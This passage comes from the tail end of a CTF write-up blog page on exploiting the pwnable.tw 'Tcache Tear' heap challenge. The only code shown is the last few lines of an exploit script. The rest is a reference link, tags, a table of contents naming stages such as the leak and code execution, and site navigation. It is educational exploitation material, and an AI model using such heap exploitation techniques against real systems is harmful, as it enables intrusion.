class="line">stage_overwrite(libc_base)</span><br><span class="line">stage_final()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p><img src="flag.png" alt="Exploit Execution Trace"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a target="_blank" rel="noopener" href="https://segflow.github.io/post/noxale-ctf-grocery_list/">Exploitation technique reference</a></li></ol></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Linux/">Linux</a><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/pwnable/">pwnable</a><a class="link-muted mr-2" rel="tag" href="/tags/Exploitation/">Exploitation</a><a class="link-muted mr-2" rel="tag" href="/tags/pwnable-tw/">pwnable-tw</a><a class="link-muted mr-2" rel="tag" href="/tags/Heap-Exploitation/">Heap Exploitation</a></div></article></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/02/15/arm-architecture-webinar/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">ARM Architecture and Shellcode Webinars</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/07/12/binary-exploitation-pwnable-tw-caov/"><span class="level-item">Binary Exploitation [pwnable.tw] - CAOV</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config=function(){this.page.url="https://www.taintedbits.com/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/",this.page.identifier="/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/"};!function(){var t=document,e=t.createElement("script");e.src="//taintedbits.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen order-1"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Challange-Description"><span class="level-left"><span class="level-item">1</span><span class="level-item">Challange Description</span></span></a></li><li><a class="level is-mobile" href="#Binary-Protection"><span class="level-left"><span class="level-item">2</span><span class="level-item">Binary Protection</span></span></a></li><li><a class="level is-mobile" href="#The-Vulnerability"><span class="level-left"><span class="level-item">3</span><span class="level-item">The Vulnerability</span></span></a></li><li><a class="level is-mobile" href="#Write-Primitive"><span class="level-left"><span class="level-item">4</span><span class="level-item">Write Primitive</span></span></a></li><li><a class="level is-mobile" href="#The-Leak"><span class="level-left"><span class="level-item">5</span><span class="level-item">The Leak</span></span></a></li><li><a class="level is-mobile" href="#Code-Execution"><span class="level-left"><span class="level-item">6</span><span class="level-item">Code Execution</span></span></a></li><li><a class="level is-mobile" href="#Exploit-Code"><span class="level-left"><span class="level-item">7</span><span class="level-item">Exploit Code</span></span></a></li><li><a class="level is-mobile" href="#Reference"><span class="level-left"><span class="level-item">8</span><span class="level-item">Reference</span></span></a></li></ul></div></div><style>#toc .menu-list>li>a.is-active+.menu-list{display:block}#toc .menu-list>li>a+.menu-list{display:none}</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time datetime="2021-02-14T18:30:00.000Z">2021-02-15</time></p><p class="title"><a href="/2021/02/15/arm-architecture-webinar/">ARM Architecture and Shellcode Webinars</a></p><p class="categories"><a href="/categories/Binary-Exploitation/">Binary Exploitation</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-17T18:30:00.000Z">2020-07-18</time></p><p class="title"><a href="/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/">Binary Exploitation [pwnable.tw] - Tcache Tear</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-11T18:30:00.000Z">2020-07-12</time></p><p class="title"><a href="/2020/07/12/binary-exploitation-pwnable-tw-caov/">Binary Exploitation [pwnable.tw] - CAOV</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-10T18:30:00.000Z">2020-07-11</time></p><p class="title"><a href="/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/">Binary Exploitation [pwnable.tw] - Spirited Away</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-04T18:30:00.000Z">2020-07-05</time></p><p class="title"><a href="/2020/07/05/binary-exploitation-pwnable-tw-realloc/">Binary Exploitation [pwnable.tw] - Realloc</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Binary-Exploitation/"><span class="level-start"><span class="level-item">Binary Exploitation</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Brain-Logs/"><span class="level-start"><span class="level-item">Brain Logs</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/CTF-Writeups/"><span class="level-start"><span class="level-item">CTF Writeups</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/Exploitation/"><span class="level-start"><span class="level-item">Exploitation</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/IoT/"><span class="level-start"><span class="level-item">IoT</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/categories/Machine-Learning/"><span class="level-start"><span class="level-item">Machine Learning</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/Malware-Analysis/"><span class="level-start"><span class="level-item">Malware Analysis</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/NLP/"><span class="level-start"><span class="level-item">NLP</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Reverse-Engineering/"><span class="level-start"><span class="level-item">Reverse Engineering</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ACS712/"><span class="tag">ACS712</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Arduino/"><span class="tag">Arduino</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Bare-Metal/"><span class="tag">Bare-Metal</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Chat-Bots/"><span class="tag">Chat Bots</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Classification/"><span class="tag">Classification</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Data-Wrangling/"><span class="tag">Data Wrangling</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dev/"><span class="tag">Dev</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dropper/"><span class="tag">Dropper</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ESP8266/"><span class="tag">ESP8266</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Editor/"><span class="tag">Editor</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Emacs/"><span class="tag">Emacs</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Exploitation/"><span class="tag">Exploitation</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/GandCrab/"><span class="tag">GandCrab</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Grey-Energy/"><span class="tag">Grey Energy</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Heap-Exploitation/"><span class="tag">Heap Exploitation</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Kernel-Debugging/"><span class="tag">Kernel Debugging</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">15</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux-Malware/"><span class="tag">Linux Malware</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Malware-Analysis/"><span class="tag">Malware Analysis</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ROP/"><span class="tag">ROP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Regression/"><span class="tag">Regression</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Reverse-Engineering/"><span class="tag">Reverse Engineering</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Visualization/"><span class="tag">Visualization</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WarGames/"><span class="tag">WarGames</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Malware/"><span class="tag">Windows Malware</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Reversing/"><span class="tag">Windows Reversing</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/glibc/"><span class="tag">glibc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/javascript-obfuscation/"><span class="tag">javascript obfuscation</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable/"><span class="tag">pwnable</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-kr/"><span class="tag">pwnable-kr</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-tw/"><span class="tag">pwnable-tw</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/radare2/"><span class="tag">radare2</span><span class="tag">4</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/images/logo-header.png" alt="Tainted Bits" height="28"></a><p class="is-size-7"><span>&copy; 2021 D3xt3r</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by-sa/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Subscribe" href="https://mailchi.mp/d744c1f04904/taintedbits"><i class="fa fa-envelope"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en")</script><script>var IcarusThemeSettings={article:{highlight:{clipboard:!0,fold:"unfolded"}}}</script><script src="/js/column.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load",()=>{"function"==typeof $.fn.lightGallery&&$(".article").lightGallery({selector:".gallery-item"}),"function"==typeof $.fn.justifiedGallery&&($(".justified-gallery > p > .gallery-item").length&&$(".justified-gallery > p > .gallery-item").unwrap(),$(".justified-gallery").justifiedGallery())})</script><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now</a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load",(function(){outdatedBrowser({bgColor:"#f25648",color:"#ffffff",lowerThan:"object-fit"})}))</script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener("DOMContentLoaded",(function(){loadInsight({contentUrl:"/content.json"},{hint:"Type something...",untitled:"(Untitled)",posts:"Posts",pages:"Pages",categories:"Categories",tags:"Tags"})}))</script></body></html>